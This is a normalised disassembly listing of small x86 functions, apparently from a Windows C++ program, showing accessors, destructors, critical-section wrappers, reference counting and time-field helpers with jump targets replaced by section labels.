sub_40e3e0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x10 ]
mov edx [ esp + 0x8 ]
mov [ edx ] ecx
xor eax eax
retn 0x8
sub_40e400
mov eax 0x80004001
retn 0x8
sub_40e410
xor eax eax
retn 0x4
sub_40e420
xor eax eax
retn 0x4
sub_40e430
xor eax eax
retn 0x4
sub_40e4c0
mov eax 0x80004001
retn 0xc
sub_40e4d0
xor eax eax
retn 0x8
sub_40e4e0
xor eax eax
retn 0x4
sub_40e4f0
mov eax 0x80004001
retn 0x4
sub_40e500
mov eax 0x80004001
retn 0x4
sub_40e510
xor eax eax
retn 0x8
sub_40e520
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
retn 0xc
mov [ eax ] 0x0
sub_40e540
mov eax 0x1
retn 0x8
sub_40e550
mov eax 0x1
retn 0x4
sub_40e560
xor eax eax
retn 0x4
sub_40e570
mov eax 0x1
retn 0x4
sub_40e580
mov eax 0x1
retn 0x8
sub_40e590
xor eax eax
retn 0x4
sub_40e5a0
xor eax eax
retn 0x8
sub_40e5b0
mov eax 0x1
retn 0x10
sub_40e5c0
mov eax 0x1
retn 0x8
sub_40e5d0
xor eax eax
retn 0xc
sub_40e5e0
mov eax 0x80004001
retn 0x14
sub_40e5f0
mov eax 0x1
retn 0x8
sub_40e600
mov eax 0x1
retn 0x14
sub_40e610
mov ecx [ ecx ]
mov edx [ esp + 0x4 ]
xor eax eax
cmp ecx edx
setne al
retn 0x4
sub_40e620
mov eax [ ecx ]
retn
sub_40e6f0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40e700
retn
sub_40e920
mov eax [ ecx + 0x8 ]
retn
sub_40e930
mov eax ecx
retn
sub_40e940
mov eax [ esp + 0x4 ]
retn
sub_40e950
mov eax [ esp + 0x4 ]
add eax 0x4
retn
sub_40e960
mov eax ecx
retn 0x4
sub_40e970
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_40e980
mov eax [ ecx ]
retn
sub_40e990
mov eax [ esp + 0x4 ]
add eax 0x8
retn
sub_40e9a0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40e9f0
mov eax 0xfffffff
retn
sub_40ea00
mov eax ecx
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
retn
sub_40ea10
mov eax ecx
retn 0x4
sub_40ea20
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
shl eax 0x3
push eax
call sub_42e3bc
add esp 0x4
retn
sub_40ea40
retn
sub_40ea50
retn
sub_40ea60
mov eax ecx
retn 0x4
sub_40ea70
add ecx 0x4
push ecx
call [ EnterCriticalSection@IAT ]
mov al 0x1
retn
sub_40ea80
add ecx 0x4
push ecx
call [ LeaveCriticalSection@IAT ]
mov al 0x1
retn
sub_40ea90
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov [ esi ] eax
add eax 0x4
push eax
call [ EnterCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x4
sub_40eab0
mov eax [ ecx ]
add eax 0x4
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_40eb30
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
shl eax 0x3
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_40eb50
retn 0x4
sub_40eb60
retn 0x4
sub_40eb70
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40eb80
mov eax [ ecx ]
add eax 0x8
retn
sub_40eb90
mov eax 0xfffffff
retn
sub_40eba0
mov eax ecx
retn 0x4
sub_40ebb0
mov eax ecx
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
retn
sub_40ebc0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_40ebe0
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40ebf0
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_40ec00
mov eax [ ecx ]
add eax 0x8
retn
sub_40eccc
mov eax [ ebp - 0x14 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_40ed70
mov eax ecx
retn 0x4
sub_40ed80
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_40eda0
mov edx [ ecx ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_40edb0
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
add eax 0x8
retn
sub_40eeaf
mov eax [ ebp - 0x14 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_40eed0
push esi
mov esi ecx
call sub_40ec10
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_40eef0
mov eax ecx
retn 0x4
sub_40ef00
push esi
mov esi ecx
call sub_40ee40
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
sub_40ef20
push esi
mov esi ecx
call sub_40ec10
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_40f280
mov eax 0x1
retn
sub_40f290
retn
sub_40f2d0
mov eax ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
sub_40f2e0
mov ecx [ ecx ]
mov edx [ esp + 0x4 ]
xor eax eax
cmp ecx edx
sete al
retn 0x4
sub_40f2f0
mov eax ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
sub_40f300
mov ecx [ ecx ]
mov edx [ esp + 0x4 ]
xor eax eax
cmp ecx edx
sete al
retn 0x4
sub_40f310
mov eax [ ecx ]
retn
sub_40f320
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_40f330
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_40f340
push esi
mov esi ecx
call sub_40f010
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40f360
push esi
mov esi ecx
call sub_40f240
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_40f380
mov eax [ ecx ]
retn
sub_40f390
mov eax [ ecx + 0x8 ]
retn
sub_40f3a0
mov eax [ ecx ]
retn
sub_40f3b0
mov ecx [ ecx ]
jmp sub_40f080
sub_40f460
mov eax [ ecx + 0x10 ]
add eax 0xc
retn
sub_40f980
push esi
mov esi ecx
push 0x0
lea ecx [ esi + 0x8 ]
call sub_40f5b0
push 0x0
mov ecx esi
call sub_40f4c0
pop esi
retn
sub_40ff40
mov al [ ecx + 0x4 ]
retn
sub_40ff80
mov al [ ecx + 0x4 ]
retn
sub_410040
mov al [ ecx + 0x4 ]
retn
sub_410050
mov al [ ecx + 0x4 ]
retn
sub_410c8f
push 0x1
push 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov eax sub_410ca9
retn
sub_410e62
push 0x1
push 0x4
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov eax r-xdata
retn
sub_4110b9
push 0x1
push 0x4
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov eax sub_4110d3
retn
sub_41128f
push 0x1
push 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov eax sub_4112a9
retn
sub_411462
push 0x1
push 0x4
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov eax r-xdata
retn
sub_4116ba
push 0x1
push 0x4
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov eax sub_4116d4
retn
sub_4117a0
mov eax [ ecx + 0x10 ]
retn
sub_4117b0
mov edx [ ecx + 0x10 ]
xor eax eax
test edx edx
sete al
retn
sub_4117c0
mov eax ecx
retn
sub_4117d0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_4117e0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_4117f0
mov eax ecx
retn 0x4
sub_411830
mov eax 0x1fffffff
retn
sub_411840
mov edx [ esp + 0x4 ]
mov eax ecx
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
retn 0x8
sub_411860
mov eax [ esp + 0x4 ]
lea ecx [ eax * 8 ]
push ecx
call sub_42e3bc
add esp 0x4
retn
sub_411880
retn
sub_411890
retn
sub_4118a0
mov eax ecx
retn 0x4
sub_4118b0
mov eax [ esp + 0x4 ]
lea ecx [ eax * 4 ]
push ecx
call sub_42e3bc
add esp 0x4
retn
sub_4118d0
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_411910
retn
sub_411a70
mov eax [ ecx + 0x10 ]
retn
sub_411a80
mov eax [ esp + 0x4 ]
lea ecx [ eax * 8 ]
push ecx
call sub_42e3bc
add esp 0x4
retn 0x4
sub_411aa0
retn 0x4
sub_411ab0
retn 0x4
sub_411af0
mov eax 0x1fffffff
retn
sub_411b70
mov eax [ esp + 0x4 ]
lea ecx [ eax * 4 ]
push ecx
call sub_42e3bc
add esp 0x4
retn 0x4
sub_411b90
mov edx [ esp + 0x4 ]
mov eax ecx
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
retn 0x8
sub_411be0
retn
sub_411bf0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_411c60
mov edx [ ecx + 0xc ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
retn 0x4
sub_411c70
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
retn
dec eax
mov [ ecx + 0x10 ] eax
jne r-xdata
mov [ ecx + 0xc ] 0x0
sub_411c90
mov eax ecx
retn 0x4
sub_411ca0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_411d10
mov eax ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn
j_sub_411d60
jmp sub_411d60
j_sub_411f70
jmp sub_411f70
sub_412350
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
retn 0x8
sub_412360
mov eax ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
retn
sub_4123a0
retn
sub_4123e0
lea eax [ ecx + 0x10 ]
retn
sub_4123f0
add ecx 0xc
mov eax 0x1
[ ecx ] eax
retn
sub_412400
mov edx [ ecx + 0xc ]
xor eax eax
test edx edx
setl al
retn
sub_412410
mov edx [ ecx + 0xc ]
xor eax eax
cmp edx 0x1
setg al
retn
sub_412420
lea eax [ ecx + 0xc ]
or edx 0xffffffff
[ eax ] edx
dec edx
test edx edx
jg r-xdata
retn
mov eax [ ecx ]
mov edx [ eax ]
push ecx
mov ecx eax
call [ edx + 0x4 ]
__imp__vscwprintf
jmp [ _vscwprintf@IAT ]
__imp_vswprintf
jmp [ vswprintf@IAT ]
sub_412460
mov eax ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
sub_4124f0
mov eax [ ecx + 0x4 ]
cmp eax [ esp + 0x8 ]
jg r-xdata
xor eax eax
retn 0x8
jl r-xdata
mov eax 0x1
retn 0x8
mov ecx [ ecx ]
cmp ecx [ esp + 0x4 ]
ja r-xdata
sub_412540
push ecx
call [ _localtime64@IAT ]
add esp 0x4
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x14 ]
add eax 0x76c
retn
sub_412560
push ecx
call [ _localtime64@IAT ]
add esp 0x4
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x10 ]
inc eax
retn
sub_412580
push ecx
call [ _localtime64@IAT ]
add esp 0x4
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
retn
sub_4125a0
push ecx
call [ _localtime64@IAT ]
add esp 0x4
test eax eax
je r-xdata
or eax 0xffffffff
retn
mov eax [ eax + 0x8 ]
retn
sub_4125c0
push ecx
call [ _localtime64@IAT ]
add esp 0x4
test eax eax
je r-xdata
or eax 0xffffffff
retn
mov eax [ eax + 0x4 ]
retn
sub_4125e0
push ecx
call [ _localtime64@IAT ]
add esp 0x4
test eax eax
je r-xdata
or eax 0xffffffff
retn
mov eax [ eax ]
retn
sub_412600
mov eax [ esp + 0x4 ]
add eax 0x10
mov [ ecx ] eax
retn 0x4
sub_412610
mov eax [ ecx ]
sub eax 0x10
retn
sub_412620
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
push 0x80070057
call sub_401d20
mov edx [ ecx ]
cmp eax [ edx - 0x8 ]
jg r-xdata
mov [ edx - 0xc ] eax
mov ecx [ ecx ]
mov [ ecx + eax * 2 ] 0x0
retn 0x4
sub_412660
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
push 0x80070057
call sub_401d20
mov edx [ ecx ]
cmp eax [ edx - 0x8 ]
jg r-xdata
mov [ edx - 0xc ] eax
mov ecx [ ecx ]
mov [ ecx + eax * 2 ] 0x0
retn 0x4
sub_4126c0
push 0x8007000e
call sub_401d20
sub_412970
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_4129f0
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
sub_412ce0
mov ecx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0xc ]
call sub_412c60
retn
sub_412ea0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push eax
push ecx
call [ RaiseException@IAT ]
retn
sub_412ec0
push ecx
call [ EnterCriticalSection@IAT ]
xor eax eax
retn
sub_412ed0
push ecx
call [ LeaveCriticalSection@IAT ]
xor eax eax
retn
sub_412f14
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x1c ] edx
mov eax 0x1
retn
sub_412f60
push ecx
call [ DeleteCriticalSection@IAT ]
xor eax eax
retn
sub_412fc0
cmp [ ecx ] 0x0
jne r-xdata
jmp [ ecx + 0x4 ]
xor eax eax
retn 0x14
sub_413000
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_413010
mov eax ecx
mov [ eax ] r--data
retn
sub_413020
mov [ ecx ] r--data
retn
sub_413030
retn
sub_413040
retn
sub_4130f0
mov eax ecx
xor ecx ecx
lea edx [ eax + 0xc ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov [ edx + 0x14 ] ecx
retn
sub_4132c0
mov eax [ ecx + 0x4 ]
push eax
call [ SetEvent@IAT ]
retn
sub_4132d0
push esi
mov esi ecx
call sub_4132f0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_413330
mov eax ecx
retn
sub_413340
lea eax [ ecx + 0x1c ]
retn
sub_413350
mov eax [ ecx + 0x21c ]
retn
sub_413360
lea eax [ ecx + 0x220 ]
retn
sub_413370
lea eax [ ecx + 0x23c ]
retn
sub_413570
mov eax [ ecx ]
push eax
call [ ResetEvent@IAT ]
retn
sub_4135c0
mov eax 0x1
retn 0x4
sub_4135d0
retn
sub_4135e0
retn
sub_4135f0
retn
sub_413600
retn
sub_413610
xor eax eax
retn
sub_413840
mov eax ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
sub_413850
mov ecx [ ecx ]
mov edx [ esp + 0x4 ]
xor eax eax
cmp ecx edx
setne al
retn 0x4
sub_413860
sub esp 0x8
mov eax [ esp + 0xc ]
lea ecx [ esp ]
push ecx
mov [ esp + 0x4 ] 0x8
mov [ esp + 0x8 ] eax
call [ InitCommonControlsEx@IAT ]
add esp 0x8
retn
sub_413890
mov edx [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov eax [ ecx + 0xc ]
sub eax edx
sar eax 0x3
retn
xor eax eax
retn
sub_4138b0
mov edx [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax edx
sar eax 0x3
retn
xor eax eax
retn
sub_4138d0
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_4138e0
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_413900
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_413940
mov eax ecx
mov ecx [ esp + 0x4 ]
lea edx [ ecx * 8 ]
add [ eax ] edx
retn 0x4
sub_413960
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_413970
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
sar eax 0x3
retn 0x4
sub_413980
mov eax 0x1fffffff
retn
sub_413990
mov eax [ esp + 0x4 ]
lea ecx [ eax * 8 ]
push ecx
call sub_42e3bc
add esp 0x4
retn
sub_4139b0
push ecx
mov al [ esp + 0x3 ]
pop ecx
retn
sub_413a20
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_413a30
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_413a50
mov [ ecx ] r--data
retn
sub_413a60
mov eax [ ecx + 0x4 ]
retn
sub_413a70
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_413a90
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_413aa0
mov eax [ ecx + 0x4 ]
retn
sub_413af0
retn
sub_413b70
mov eax [ esp + 0x4 ]
add eax 0x19
retn
sub_413b80
mov eax [ esp + 0x4 ]
retn
sub_413b90
mov eax [ esp + 0x4 ]
add eax 0x4
retn
sub_413ba0
mov eax [ esp + 0x4 ]
add eax 0x8
retn
sub_413bb0
mov eax [ ecx + 0x4 ]
add eax 0x4
retn
sub_413bc0
mov eax [ esp + 0x4 ]
retn
sub_413bd0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov edx [ esp + 0x8 ]
push esi
mov esi [ edx ]
xor eax eax
cmp ecx esi
setl al
pop esi
retn 0x8
sub_413bf0
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x8
sub_413c00
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_413c10
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_413c20
mov eax [ ecx ]
retn
sub_413c30
mov eax ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov [ eax ] edx
mov dl [ ecx ]
mov [ eax + 0x4 ] dl
retn 0x8
sub_413c50
mov eax [ esp + 0x4 ]
add eax 0x18
retn
sub_413c60
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_413c70
mov eax [ ecx + 0x4 ]
retn
sub_413ce0
mov eax [ ecx + 0x4 ]
add eax 0x8
retn
sub_413d50
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_413d60
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x19 ]
test dl dl
jne r-xdata
retn
mov edi edi
mov eax ecx
mov ecx [ eax + 0x8 ]
mov dl [ ecx + 0x19 ]
test dl dl
je r-xdata
sub_413d80
mov eax 0x15555555
retn
sub_413df0
push esi
mov esi ecx
mov eax [ esi ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x1
xor eax eax
pop esi
retn
sub_413e10
push esi
mov esi ecx
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_413e30
mov eax [ esp + 0x4 ]
imul eax eax 0x1c
push eax
call sub_42e3bc
add esp 0x4
retn
sub_413ef0
add ecx 0x14
jmp sub_413e50
sub_413fb0
push esi
mov esi ecx
call sub_413fd0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4140d0
push esi
mov esi ecx
mov eax [ esi ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x1
xor eax eax
pop esi
retn
sub_4140f0
push esi
mov esi ecx
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_414198
mov eax r-xdata
retn
sub_4142d0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_4142e0
mov eax [ ecx ]
mov ecx [ esp + 0x8 ]
lea edx [ eax + ecx * 8 ]
mov eax [ esp + 0x4 ]
mov [ eax ] edx
retn 0x8
sub_414300
mov eax [ ecx ]
mov ecx [ esp + 0x4 ]
sub eax [ ecx ]
sar eax 0x3
retn 0x4
sub_414310
mov eax 0x1fffffff
retn
sub_414380
mov eax [ esp + 0x4 ]
lea ecx [ eax * 8 ]
push ecx
call sub_42e3bc
add esp 0x4
retn 0x4
sub_414480
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_4139c0
add esp 0x8
retn 0x8
sub_414600
mov eax [ esp + 0x4 ]
add eax 0xc
retn
sub_414610
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_414620
mov eax 0x15555555
retn
sub_414630
push esi
mov esi ecx
call sub_413d90
mov eax esi
pop esi
retn
sub_414640
mov eax [ esp + 0x4 ]
imul eax eax 0x1c
push eax
call sub_42e3bc
add esp 0x4
retn 0x4
sub_4146e0
add ecx 0x8
push ecx
call [ InterlockedIncrement@IAT ]
retn
sub_4146f0
add ecx 0x8
push ecx
call [ InterlockedDecrement@IAT ]
retn
sub_414700
mov eax [ ecx + 0x8 ]
retn
sub_414760
mov eax 0x80004005
retn 0x10
sub_414770
mov eax 0x80004005
retn 0x10
sub_414780
push esi
mov esi ecx
call sub_413190
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4147a0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push r--data
push r--data
push eax
call [ ecx + 0xc ]
retn 0x4
sub_414840
push esi
mov esi ecx
call sub_413580
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_414c60
mov ecx [ ecx + 0x8 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_414c70
mov ecx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_414d00
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_4143e0
add esp 0x14
retn
sub_414e20
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn 0x4
sub_414e30
push esi
mov esi ecx
call sub_413d90
mov eax esi
pop esi
retn
j_sub_414fb0
jmp sub_414fb0
sub_415100
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_415150
movzx edx [ esp + 0x8 ]
mov [ esp + 0x8 ] edx
jmp sub_415030
sub_415c74
mov edx [ ebp - 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_415fa0
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_415d50
add esp 0x14
retn
sub_416060
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_415d50
add esp 0x10
retn 0x8
sub_416080
mov eax [ esp + 0x8 ]
sub esp 0x8
push eax
lea edx [ esp + 0x4 ]
push edx
call sub_415fc0
mov ecx [ eax ]
mov eax [ esp + 0xc ]
mov [ eax ] ecx
add esp 0x8
retn 0x8
sub_41621f
mov edx [ ebp - 0x14 ]
push edx
mov esi [ ebp - 0x24 ]
push esi
mov ecx [ ebp - 0x1c ]
call sub_416060
push esi
call ??3@YAXPAX@Z
add esp 0x4
push 0x0
push 0x0
call _CxxThrowException
sub_4164e0
add ecx 0x4
jmp sub_416470
sub_416b90
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ InterlockedIncrement@IAT ]
sub_416ba0
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_416bc0
mov [ ecx ] r--data
retn
sub_416bd0
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_416c50
add ecx 0x8
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
sub_416c60
push esi
mov esi ecx
call sub_416c80
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_416ce0
push esi
mov esi ecx
call sub_416b10
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_417040
mov eax [ ecx + 0x140 ]
retn
sub_417170
push esi
mov esi ecx
call sub_417050
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_417490
push ecx
push sub_417190
call sub_4122b0
mov ecx eax
call sub_412220
call sub_4122b0
mov ecx eax
jmp sub_411a00
sub_417610
mov eax [ ecx + 0x30 ]
retn
sub_417690
mov eax [ esp + 0x10 ]
add ecx 0x144
mov [ eax ] 0x0
call sub_41a660
xor eax eax
retn 0x10
sub_4176b0
mov eax [ esp + 0x10 ]
mov [ eax ] 0x0
xor eax eax
retn 0x10
__imp_wcsstr
jmp [ wcsstr@IAT ]
sub_4176d0
mov eax [ esp + 0x8 ]
retn
sub_417740
mov eax [ ecx ]
retn
sub_417750
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov [ esp + 0x4 ] eax
jmp [ wcslen@IAT ]
retn
sub_417770
mov eax [ esp + 0x4 ]
push 0x0
push eax
call sub_417590
add esp 0x8
retn
sub_417780
mov eax [ ecx ]
mov eax [ eax - 0xc ]
retn
sub_417790
mov eax [ ecx ]
retn
sub_4177a0
mov eax [ esp + 0xc ]
lea ecx [ eax + eax ]
mov [ esp + 0xc ] ecx
jmp [ memmove@IAT ]
sub_417850
push esi
mov esi ecx
call sub_417620
